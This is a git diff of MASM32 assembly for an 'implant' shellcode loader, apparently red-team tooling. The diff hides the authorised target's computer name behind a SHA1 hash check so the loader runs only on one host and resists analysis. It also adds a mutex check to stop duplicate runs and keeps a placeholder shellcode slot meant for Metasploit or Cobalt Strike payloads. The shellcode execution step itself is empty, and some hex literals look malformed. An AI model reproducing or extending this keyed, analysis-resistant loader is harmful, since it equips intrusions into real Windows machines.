@@ -21,8 +21,10 @@ option casemap:none
 include \masm32\include\windows.inc
 include \masm32\include\user32.inc
 include \masm32\include\kernel32.inc
+include \masm32\include\advapi32.inc
 includelib \masm32\lib\kernel32.lib
 includelib \masm32\lib\user32.lib           
+includelib \masm32\lib\advapi32.lib           
 
 ; -----------------------------------------------------------------------------
 ;  MASM works by single-pass, so all functions need to be declared
@@ -32,17 +34,15 @@ includelib \masm32\lib\user32.lib
 CheckExecution PROTO 
 MutexCheck PROTO
 GetComputerInfo PROTO :DWORD
-
+GenerateHash PROTO :DWORD,:DWORD
 
 .data         
                      
 ; The mutex name. "Local\" means per session. "Global\" means per system. Change it to whatever you want.
 strMutexName  db  "Global\Stufus",0    
 
-; The authorised NetBIOS name of the target computer.
-strPermittedName db "TESTER",0
-
-strOK db "OK",0
+; The hash of the authorised NetBIOS computer name
+hashSHA1CompterName db 53h,8Fh,68h,0F9h,2Ch,A3h,76h,0E5h,23h,0E6h,0D6h,A9h,68h,63h,0DEh,02h,7Dh,76h,0A3h,0DAh
 
 ; Had to work this out from msdn.microsoft.com/en-us/library/windows/desktop/ms724224%28v=vs.85%29.aspx
 ; and some experimentation
@@ -50,6 +50,10 @@ CNF_ComputerNamePhysicalNetBIOS           equ 4
 CNF_ComputerNamePhysicalDnsHostname       equ 5
 CNF_ComputerNamePhysicalDnsDomain         equ 6
 CNF_ComputerNamePhysicalDnsFullyQualified equ 7
+
+; From https://msdn.microsoft.com/en-us/library/windows/desktop/aa375549%28v=vs.85%29.aspx
+MS_CALG_SHA1 equ 8004h    
+MS_CALG_SHA1_HASHSIZE equ 20h ; The actual size of a returned SHA1 hash
 
 ; Replace this with the actual shellcode to run (e.g. from metasploit or cobalt strike etc)
 shellcode db 90h,90h
@@ -76,27 +80,38 @@ invoke ExitProcess, NULL    ; Exit cleanly when the time comes
 ; 
 ; -----------------------------------------------------------------------------
 
-CheckExecution PROC uses esi
+CheckExecution PROC uses esi edi
 
  ; Get the physical NETBIOS name of the host. Must free the buffer afterwards.
  invoke GetComputerInfo, CNF_ComputerNamePhysicalNetBIOS
- mov esi, eax
- invoke lstrcmp, esi, addr strPermittedName
- push eax
- invoke GlobalFree, esi
- pop eax
- test eax, eax
- jnz done
+ mov esi, eax           ; Contains the raw computer name
+ invoke lstrlen, esi    
+ mov ecx, eax           ; Contains the length of the raw computer name
+ invoke GenerateHash, esi, ecx ; Calculate the SHA1 hash of the computer name
+ mov edi, eax           ; Contains the hash of the raw computer name
+ invoke GlobalFree, esi ; Free the NETBIOS name buffer
 
- invoke MessageBox, NULL, addr strOK, NULL, NULL
+ ; Now compare the hash of the name of the host against the stored hash
+ push edi               ; Store a pointer to the raw computer name hash so we can clear it later
+ mov ecx, MS_CALG_SHA1_HASHSIZE ; ecx = length of the hash
+ cld                            ; Clear the direction flag (i.e. left-to-right comparison)
+ mov esi, offset hashSHA1CompterName ; The calculated hash is in edi, the stored hash is now in esi
+ repz cmpsb                     ; Compare [esi] and [edi] up to 'ecx' times :-)
+ jnz badhash                    ; If they are different, the hash was incorrect
 
  ; Check to see whether the implant is already running or not
  invoke MutexCheck 
- .if eax==NULL
-    nop
- .else
-    nop
- .endif
+ test eax, eax
+ jz done
+
+ ; Now run the shellcode
+
+
+; If the hash was incorrect, jump here because we
+; need to free the generated hash memory
+badhash:
+ pop edi
+ invoke GlobalFree, edi
 
 done:
  ret
@@ -115,6 +130,7 @@ CheckExecution ENDP
 
 GetComputerInfo PROC uses esi reqinfo:DWORD
 LOCAL lsize:DWORD
+
     mov lsize, 0
     invoke GetComputerNameEx, reqinfo, NULL, addr lsize ; Find out how large this string actually is
     inc lsize
@@ -160,4 +176,42 @@ MutexCheck PROC
  .endif
 MutexCheck ENDP
 
+
+
+; Generate hash using CryptoAPI
+GenerateHash PROC uses esi ptrString:DWORD,stringlength:DWORD
+LOCAL hProv:DWORD
+LOCAL hHash:DWORD
+LOCAL dwHashSize:DWORD
+LOCAL dwHashSizeLen:DWORD
+
+ mov dwHashSizeLen, 4
+ invoke CryptAcquireContext, addr hProv, NULL, NULL, PROV_RSA_AES, NULL
+ .if eax!=NULL
+   invoke CryptCreateHash, hProv, MS_CALG_SHA1, NULL, NULL, addr hHash
+   .if eax!=NULL
+     invoke CryptHashData,hHash, ptrString, stringlength, NULL
+     .if eax!=NULL
+       invoke CryptGetHashParam, hHash, HP_HASHSIZE, addr dwHashSize, addr dwHashSizeLen, NULL
+       .if eax!= NULL
+         invoke GlobalAlloc, GPTR, dwHashSize
+         .if eax!=NULL
+           mov esi, eax
+           invoke CryptGetHashParam, hHash, HP_HASHVAL, esi, addr dwHashSize, NULL
+           .if (eax!=NULL && dwHashSize==20h)
+             mov eax, esi  ; Hash is now stored in esi
+           .endif
+         .endif
+       .endif 
+     .endif
+     push eax
+     invoke CryptDestroyHash, hHash
+     pop eax
+   .endif
+   push eax
+   invoke CryptReleaseContext, hProv, NULL
+   pop eax
+ .endif
+ ret
+GenerateHash ENDP
 End stufus
